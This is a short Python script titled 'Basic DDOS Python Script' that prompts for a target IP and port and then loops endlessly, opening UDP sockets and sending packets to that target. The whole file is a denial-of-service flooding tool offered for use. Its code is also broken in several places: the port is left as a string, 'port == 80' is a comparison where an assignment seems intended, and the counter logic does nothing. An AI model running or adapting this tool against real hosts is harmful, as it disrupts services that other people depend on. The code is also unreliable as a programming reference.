import socket
import os

os.system("cls")
print("Basic DDOS Python Script")
ip = input("IP >> ")
port = input(" Port ( Default : 80 ) : ")

if port == 0:
    port == 80

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    s.connect((ip, port))
    i = 0
    if i < 10:
        s.send(b'\x01')